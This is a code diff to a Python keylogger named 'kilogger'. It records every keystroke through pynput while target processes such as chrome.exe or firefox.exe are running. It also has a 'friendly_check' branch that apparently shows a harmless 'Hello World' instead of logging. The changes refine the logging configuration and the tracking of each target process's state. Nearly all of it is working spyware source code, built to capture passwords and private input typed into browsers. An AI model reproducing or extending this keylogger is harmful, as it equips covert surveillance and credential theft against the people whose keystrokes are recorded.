@@ -18,28 +18,21 @@ is provided "as is" without warranties.
 Author: Antonino Lorenzo
 Version: 1.0.0
 
-
-TODO [x]: stop logging when target is closed
-TODO [ ]: Work on logging format
-    what should be the output? (ex. date - running targets - input)
-    can the output be buffered?
-TODO [x]: debug ListenerSocket
-TODO [x]: fix pylint
-TODO [x]: fix pycharm
-TODO [x]: complete docs in code
 TODO [ ]: Implement capture copy to clipboard functionality
 """
 
 import sys
 import time
 import socket
+import json
 import argparse
 import logging
+import logging.config
 from threading import Thread, Event
-from pathlib import Path
 
 from kilogger import (
     LOGLOC,
+    CONFIG,
     DEFAULT_TIMEOUT,
     install_package,
     verify_package_installation
@@ -77,10 +70,11 @@ class PathParser(argparse.Action):
     """Parses the given path from the command line"""
 
     def __call__(self, parser, namespace, value, option_string=None):
-        out_path = Path(value)
-        if not (out_path.exists() and out_path.is_file()):
-            print(f'Invalid path: {value}')
-            sys.exit(1)
+        # It should verify that the given path is for a file, not that it already exists
+        # out_path = Path(value)
+        # if not (out_path.exists() and out_path.is_file()):
+        #     print(f'Invalid path: {value}')
+        #     sys.exit(1)
         setattr(namespace, self.dest, value)
 
 
@@ -89,8 +83,9 @@ class KLogger(Thread):
 
     def __init__(self, *args, **kwargs):
         super().__init__(*args, **kwargs)
-        self.__k_listener = Listener(on_press=KLogger._action)
+        self.__k_listener = Listener(on_press=self._action)
         self.__k_listener.daemon = True
+        self.__logger = logging.getLogger('kilogger')
 
     def run(self):
         """Run KLogger daemon"""
@@ -100,10 +95,9 @@ class KLogger(Thread):
         """Stop KLogger daemon"""
         self.__k_listener.stop()
 
-    @staticmethod
-    def _action(key):
+    def _action(self, key):
         """Called by pynput.keyboard.Listener when a button is pressed"""
-        logging.info(str(key))
+        self.__logger.info(f'> {str(key)}')
 
 
 class KLoggerFactory:
@@ -136,9 +130,10 @@ class ProcessListener(Thread):
                  sleep: int = 10, **kwargs):
         super().__init__(*args, **kwargs)
 
-        self.__targets = {t: ProcessListener.NOT_RUNNING for t in targets}
+        self.__targets = {t: (ProcessListener.NOT_RUNNING, ProcessListener.NOT_RUNNING) for t in targets}
         self.__logger_factory = factory
         self.__logger_status = ProcessListener.NOT_RUNNING
+        self.__logger = logging.getLogger('kilogger')
         self.__sleep = sleep
         self.__stop_event = Event()
         self.daemon = True
@@ -148,9 +143,16 @@ class ProcessListener(Thread):
         snapshot = [p.name().lower() for p in psutil.process_iter(['name'])]
         for tr_process in self.__targets.keys():
             if tr_process in snapshot:
-                self.__targets[tr_process] = ProcessListener.RUNNING
+                # Keep state of the previous state
+                if self.__targets[tr_process][1] == ProcessListener.NOT_RUNNING:
+                    self.__targets[tr_process] = (ProcessListener.NOT_RUNNING, ProcessListener.RUNNING)
+                else:
+                    self.__targets[tr_process] = (ProcessListener.RUNNING, ProcessListener.RUNNING)
             else:
-                self.__targets[tr_process] = ProcessListener.NOT_RUNNING
+                if self.__targets[tr_process][1] == ProcessListener.RUNNING:
+                    self.__targets[tr_process] = (ProcessListener.RUNNING, ProcessListener.NOT_RUNNING)
+                else:
+                    self.__targets[tr_process] = (ProcessListener.NOT_RUNNING, ProcessListener.NOT_RUNNING)
 
     def run(self):
         """
@@ -162,18 +164,19 @@ class ProcessListener(Thread):
             self.find_process()
             active_count = 0
             for tr_process, status in self.__targets.items():
-                logging.info(f'{status}: {tr_process}.')
+                if status[0] != status[1]:
+                    self.__logger.info(f'{status[1]:#>20}: {tr_process:#<20}')
 
-                if status == ProcessListener.RUNNING:
+                if status[1] == ProcessListener.RUNNING:
                     active_count += 1
 
                 # found target process in running processes => start logging
-                if (status == ProcessListener.RUNNING and
+                if (status[1] == ProcessListener.RUNNING and
                         self.__logger_status == ProcessListener.NOT_RUNNING):
                     self.__logger_status = ProcessListener.RUNNING
                     self.__logger_factory.start()
 
-            logging.info(f'Active targets: {active_count}')
+            # self.__logger.info(f'[i] Active targets: {active_count}')
             if (active_count == 0 and
                     self.__logger_status == ProcessListener.RUNNING):
                 self.__logger_factory.stop()
@@ -293,8 +296,7 @@ def main():
         '--targets',
         action=StringToList,
         default=[],
-        help=
-        'Name of target processes (ex. "chrome.exe, firefox.exe"); '
+        help='Name of target processes (ex. "chrome.exe, firefox.exe"); '
         'note: process names should be separated by ", ".'
     )
 
@@ -303,7 +305,13 @@ def main():
             and friendly_check()):  # big brain time
         print('Hello World')
     else:
-        logging.basicConfig(filename=args.output, level=logging.DEBUG)
+        with open(CONFIG, 'rt') as conf:
+            config = json.load(conf)
+
+        config['handlers']['file']['filename'] = args.output
+        logging.config.dictConfig(config)
+        # logger = logging.getLogger('kilogger')
+        # logging.basicConfig(filename=args.output, level=logging.DEBUG)
 
         # --- Run logger
         logger_factory = KLoggerFactory()
